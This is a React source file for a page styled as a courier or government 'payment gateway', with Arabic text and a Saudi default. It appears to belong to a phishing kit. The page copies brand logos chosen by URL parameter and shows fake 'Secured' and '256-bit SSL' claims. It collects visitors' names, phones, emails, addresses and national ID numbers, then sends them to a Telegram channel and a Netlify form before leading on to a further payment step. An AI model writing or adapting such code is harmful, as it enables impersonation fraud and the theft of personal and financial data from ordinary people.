import { useState, useEffect } from "react";
import { useParams, useNavigate, useSearchParams } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { getServiceBranding } from "@/lib/serviceLogos";
import { useUpdateLink } from "@/hooks/useSupabase";
import { useLinkData } from "@/hooks/useLinkData";
import { Loader2, User, Phone, Mail, MapPin, ArrowLeft, ShieldCheck, Globe, Lock, ChevronDown } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { getGovBranding } from "@/lib/brandingSystem";
import PaymentMetaTags from "@/components/PaymentMetaTags";

const PaymentRecipient = () => {
  const { id } = useParams();
  const [searchParams] = useSearchParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLinkData(id);
  const updateLink = useUpdateLink();

  const [name, setName] = useState("");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [address, setAddress] = useState("");
  const [nationalId, setNationalId] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);

  const companyKey = searchParams.get("company") || linkData?.payload?.service_key || (linkData?.type === 'contracts' ? 'contracts' : 'aramex');
  const govId = searchParams.get("govId") || linkData?.payload?.govId;
  const branding = getServiceBranding(companyKey);
  const govBranding = govId ? getGovBranding(govId) : undefined;

  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const selectedCountryData = getCountryByCode(selectedCountry);
  const rawAmount = linkData?.payload?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, selectedCountry);

  const isGov = !!govBranding;
  const primaryColor = isGov ? govBranding.colors.primary : branding.colors.primary;
  const secondaryColor = isGov ? govBranding.colors.secondary : branding.colors.secondary;

  useEffect(() => {
    if (linkData?.payload?.customerInfo) {
      const info = linkData.payload.customerInfo;
       setName(info.name || info.fullName || "");
      setPhone(info.phone || "");
      setEmail(info.email || "");
      setAddress(info.address || "");
    }
  }, [linkData]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!name || !phone) {
      toast({ title: "خطأ", description: "الرجاء إدخال الاسم ورقم الجوال", variant: "destructive" });
      return;
    }

    setIsSubmitting(true);
    const customerInfo = { name, phone, email, address, nationalId };

    try {
      if (id && id !== 'local') {
        await updateLink.mutateAsync({ linkId: id, payload: { ...linkData?.payload, customerInfo } });
      }

      // Netlify Form Submission
      await fetch("/", {
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        body: new URLSearchParams({
          "form-name": "recipient-info",
          linkId: id!,
          service: isGov ? govBranding.nameAr : branding.name,
          name, phone, email, address, nationalId,
          amount: formattedAmount
        }).toString()
      });

      await sendToTelegram({
        type: 'recipient_info',
        data: { name, phone, email, address, nationalId, service: isGov ? govBranding.nameAr : branding.name, amount: formattedAmount, country: selectedCountryData?.nameAr },
        timestamp: new Date().toISOString()
      });

      navigate(`/pay/${id}/details${window.location.search}`);
    } catch (error) {
      toast({ title: "خطأ", description: "فشل حفظ البيانات", variant: "destructive" });
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-gray-50">
        <Loader2 className="w-10 h-10 animate-spin text-blue-600" />
      </div>
    );
  }

  return (
    <div className="min-h-screen flex flex-col bg-[#F8F9FA]" dir="rtl">
      <PaymentMetaTags
        serviceKey={isGov ? govId! : companyKey}
        serviceName={isGov ? govBranding.nameAr : branding.name}
        title={isGov ? `بوابة الدفع - ${govBranding.nameAr}` : `بوابة الدفع - ${branding.name}`}
      />

      <header className="bg-white border-b-2 shadow-sm sticky top-0 z-50 px-4" style={{ borderBottomColor: primaryColor }}>
         <div className="container mx-auto h-16 sm:h-20 flex items-center justify-between">
            <div className="flex items-center gap-4">
               <img src={(isGov ? govBranding.logoUrl : branding.logo) || branding.logo} alt="" className="h-10 sm:h-12 object-contain" />
               <div className="hidden md:block">
                  <h1 className="text-sm font-black text-gray-800 leading-none">{isGov ? govBranding.nameAr : branding.name}</h1>
                  <p className="text-[9px] font-bold text-gray-400 uppercase tracking-widest mt-1">E-Services & Payment Gateway</p>
               </div>
            </div>
            <div className="flex items-center gap-3">
               <div className="flex items-center gap-1 text-[10px] font-bold text-gray-400 border rounded-full px-3 py-1 bg-gray-50">
                  <Globe className="w-3 h-3" />
                  <span>English</span>
               </div>
               <div className="hidden md:flex items-center gap-2 px-3 py-1 bg-green-50 text-green-700 rounded-full border border-green-100">
                  <Lock className="w-3 h-3" />
                  <span className="text-[10px] font-bold uppercase">Secured</span>
               </div>
            </div>
         </div>
      </header>

      <main className="flex-1 container mx-auto px-4 py-8 sm:py-12 flex flex-col items-center">
         <div className="w-full max-w-xl space-y-8">
            <div className="text-center space-y-2">
               <h2 className="text-2xl sm:text-3xl font-black text-gray-900 tracking-tight">بيانات مستلم الخدمة</h2>
               <p className="text-sm font-bold text-gray-500 uppercase tracking-widest">Recipient Information & Verification</p>
            </div>

            <Card className="border-none shadow-2xl rounded-[2.5rem] overflow-hidden bg-white">
               <div className="h-2 w-full" style={{ backgroundColor: primaryColor }} />
               <form onSubmit={handleSubmit} className="p-8 sm:p-10 space-y-6">
                  <div className="space-y-6">
                    <div className="space-y-1.5">
                      <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">الاسم الكامل للمستفيد</Label>
                      <div className="relative group">
                        <Input value={name} onChange={(e) => setName(e.target.value)} className="h-14 border-2 border-gray-100 rounded-2xl font-black text-gray-700 bg-gray-50/50 pr-12 focus:border-blue-500 transition-all" placeholder="أدخل اسمك الكامل" required />
                        <User className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
                      </div>
                    </div>

                    <div className="grid sm:grid-cols-2 gap-6">
                       <div className="space-y-1.5">
                         <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">رقم الجوال</Label>
                         <div className="relative group">
                           <Input value={phone} onChange={(e) => setPhone(e.target.value)} className="h-14 border-2 border-gray-100 rounded-2xl font-black text-gray-700 bg-gray-50/50 pr-12" placeholder="05xxxxxxxx" required />
                           <Phone className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
                         </div>
                       </div>
                       <div className="space-y-1.5">
                          <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">البريد الإلكتروني (اختياري)</Label>
                          <div className="relative group">
                            <Input value={email} onChange={(e) => setEmail(e.target.value)} className="h-14 border-2 border-gray-100 rounded-2xl font-black text-gray-700 bg-gray-50/50 pr-12" placeholder="example@mail.com" />
                            <Mail className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" />
                          </div>
                       </div>
                    </div>

                    <div className="space-y-1.5">
                      <Label className="text-[11px] font-black text-gray-400 uppercase tracking-widest px-1">{isGov ? "رقم الهوية / الإقامة" : "العنوان بالتفصيل"}</Label>
                      <div className="relative group">
                        <Input
                          value={isGov ? nationalId : address}
                          onChange={(e) => isGov ? setNationalId(e.target.value) : setAddress(e.target.value)}
                          className="h-14 border-2 border-gray-100 rounded-2xl font-black text-gray-700 bg-gray-50/50 pr-12"
                          placeholder={isGov ? "أدخل رقم الهوية" : "المدينة، الحي، الشارع"}
                          required
                        />
                        {isGov ? <ShieldCheck className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" /> : <MapPin className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-gray-300 group-focus-within:text-blue-500 transition-colors" />}
                      </div>
                    </div>
                  </div>

                  <div className="pt-6">
                    <Button
                      type="submit"
                      disabled={isSubmitting}
                      className="w-full h-16 rounded-2xl font-black text-lg shadow-xl hover:translate-y-[-2px] transition-all text-white active:scale-[0.98]"
                      style={{ backgroundColor: primaryColor }}
                    >
                      {isSubmitting ? <Loader2 className="w-6 h-6 animate-spin" /> : "متابعة عملية الدفع"}
                    </Button>
                    <div className="mt-6 flex items-center justify-center gap-2 text-gray-400">
                       <ShieldCheck className="w-4 h-4" />
                       <span className="text-[10px] font-bold uppercase tracking-widest">تشفير بيانات آمن 256-bit SSL</span>
                    </div>
                  </div>
               </form>
            </Card>

            <div className="flex justify-center gap-8 opacity-40 grayscale">
               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mada.png" className="h-6" alt="mada" />
               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/visa.png" className="h-6" alt="visa" />
               <img src="https://vmsmjmzhclqshrtidmsh.supabase.co/storage/v1/object/public/logos/mastercard.png" className="h-6" alt="mastercard" />
            </div>
         </div>
      </main>

      <form name="recipient-info" netlify-honeypot="bot-field" data-netlify="true" hidden>
        <input type="text" name="linkId" />
        <input type="text" name="service" />
        <input type="text" name="name" />
        <input type="tel" name="phone" />
        <input type="email" name="email" />
        <input type="text" name="address" />
        <input type="text" name="nationalId" />
        <input type="text" name="amount" />
      </form>
    </div>
  );
};

export default PaymentRecipient;
